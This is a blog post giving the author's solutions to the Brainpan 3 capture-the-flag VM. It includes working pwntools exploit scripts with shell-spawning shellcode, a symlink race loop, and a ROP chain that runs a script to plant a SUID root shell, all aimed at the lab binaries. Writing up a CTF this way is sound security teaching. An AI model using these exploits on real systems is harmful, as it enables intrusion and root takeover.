---
layout: post
title: "Brainpan 3 solution"
date: 2015-10-13 05:10:00 -0400
comments: true
categories: boot2root
---

It's been a little over 3 months now since Brainpan 3 was first released. I offered stickers to those who could solve the challenge and I was not disappointed with the results! Some brilliant folks out there solved it in some very interesting ways. Since I've already given away all the stickers, I figured I'd go ahead and share my solution for the challenges. This won't be a step-by-step walkthrough. If you want a full walkthrough, you'll find some great ones [here](https://www.vulnhub.com/entry/brainpan-3,121/). 

First up, the report binary. The report binary has ASLR, NX, and stack canaries. It takes two arguments, a string, and a value of either 0, or 1. You would've noticed that setting the second argument to 0 would cause a segmentation fault. This occurs in the record\_id() function when it tries to copy the string to a 3 byte buffer. record\_id() is only called when the second argument is set to 0. Although it's compiled with -fstack-protector, stack canaries aren't enabled on functions that have arrays of less than 4 bytes, and so it doesn't trigger a stack smashing protection error. Now on the server, the report binary is running with the second argument set to 0. That means to exploit this, you'd need to provide a large enough string to overwrite argv[2] on stack to a value of 0 in order to trigger the call to record\_id() and thereby gain control of EIP. In this case, sending a null terminated string of 276 bytes will set argv[2] to 0. 

```python
#!/usr/bin/env python
from pwn import *

log.info("Connecting to brainpan3")
r = remote("192.168.74.171", 1337)
r.recv()

r.send("%p.%p.%p.%p.%p.%p.%p\n")
data = r.recvline().split(".")
access_code = str(int(data[2],16))
log.info("Leaked access code: " + access_code)
r.send(access_code + "\n")

r.recvuntil("ENTER COMMAND: ")
r.send("3\n")

r.recvuntil("ENTER NEW SESSION NAME: ")
buf = ""
buf += "A"*248
buf += "Y"*5
buf += "\n"
r.send(buf)

r.recvuntil("ENTER COMMAND: ")

r.send("1\n");
r.recv()
r.recv()

log.info("Sending payload")
r.send("AAA" + "\xa7\xb0\x04\x08" + "\x90"*9 + "\x31\xc9\xf7\xe1\x51\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\xb0\x0b\xcd\x80" + "B"*239 + "\n")

log.info("Getting shell")
r.interactive()
```

Moving on to the cryptor binary. This binary is stripped but has no NX and no stack canary. Right at the beginning, it calls a function 0x80485ed. A vulnerability in this function allows you to overwrite the least significant byte of EBP to 0x00 when a file length of 116 bytes is provided as the first argument. Due to ASLR, the end value of EBP right before this function returns always points to a random location. Now when this function returns to main(), main() calls leave which restores ESP from the overwritten EBP, thereby allowing you to return to some address of your choosing. 

There's a static buffer in the binary which stores the value of the second argument; the key. This buffer address never changes, so it's an ideal place to store the shellcode. The solution then is to overwrite EBP such it points to the static buffer so that when ESP is restored from EBP, main() will return to your shellcode. Again, due to ASLR, it might take a few tries before you get an address that points to your shellcode. 

```bash
#!/bin/bash

echo "[+] May need to run this several times before you get a shell"
python -c 'from pwn import *; print asm(shellcraft.linux.sh())' > sc.txt
./cryptor `python -c 'print "\x80\xa0\x04\x08"*29'` `cat sc.txt`
``` 

Ok, halfway there. Next up is the trixd binary. This binary has a couple of anti-reversing features; a call to ptrace() to prevent it from being run within gdb, and its ELF headers have been corrupted to prevent disassembly with objdump and readelf. However, you can use radare2 or IDA Pro's evaluation software to get the whole picture. You'd see that it's actually vulnerable to a race condition which would allow you to symlink puck's key to /mnt/usb/key.txt and give you access to puck's shell. 

On one terminal run:

```text
$ for i in `seq 1 5000`; do rm -f key.txt; ln -s /home/puck/key.txt; done
```

And on another:

```
$ for i in `seq 1 3000`; do nc localhost 7075; done
```

The race is relatively easy to win and you should get a shell as puck.

Ok, the final binary which stumped quite a few folks! For those of you that managed to beat it, congratultaions! The vulnerability is a pointer overwrite in the heap. This allows you to overwrite strcpy()'s GOT pointer so that when strcpy() is called again, it ends up executing your code. The binary has NX, ASLR, and stack canaries, so you need to craft a ROP chain to get a shell. Your end goal is to execute system("/tmp/foo"). The tricky part is figuring out how to get the address of system(). It's actually easily done through GOT dereferencing, described in this [paper](https://trailofbits.github.io/ctf/exploits/references/acsac09.pdf). 

The gist of it is to calculate the difference betweent the offset of system(), and the offset of another function in the binary that's already been called at least once. In this case, I used getline(). The reason you want a function that's been called at least once is because its GOT entry resolves to the function's actual address. The address of system() can therefore be calculated using *getline@GOT + (system() offset - getline() offset). 

All the gadgets needed to do this are in the binary. Here's my solution:

```python
#!/usr/bin/env python
from struct import *

"""
offset system() - getline() = 0xfffea050
getline GOT: 0x0804b00c
system() = *0x0804b00c + 0xfffea050
"""

buf  = ""
buf += "AAAA|"

buf += pack("<I", 0x8048d6e)    # popa; cld
buf += "dddd"                   # edi 
buf += "ssss"                   # esi
buf += "pppp"                   # ebp
buf += "zzzz"                   # padding
buf += pack("<I", 0x6ddad08)    # ebx, adjusted getline@got-0xe
buf += "dddd"                   # edx
buf += "cccc"                   # ecx
buf += pack("<I", 0xfffea050)   # pops into eax, offset system()-getline()
buf += pack("<I", 0x8048feb)    # add eax,[ebx+0x1270304]; ret
buf += pack("<I", 0x8048786)    # call eax
buf += pack("<I", 0x8048eef)    # pointer to /tmp/foo
buf += "Z"*164

buf += pack("<I", 0x0804b02c)   # got-entry to overwrite
buf += "\n"

buf += pack("<I", 0x8048ddc)    # rop gadget; pop4ret
buf += "|"
buf += "bbbb"

f = open("a.msg", "w")
f.write(buf)
f.close()

print "Make sure to create /tmp/foo that will run our payload"
```

For /tmp/foo, I just wrote a short bash script that copied /bin/sh to /tmp and made it SUID root. 

And that's it! Thanks again to everyone who attempted the challenge and for your comments and solutions! All the positive feedback gives me an excuse to maybe plan ahead for another Brainpan challenge and of course, more stickers.

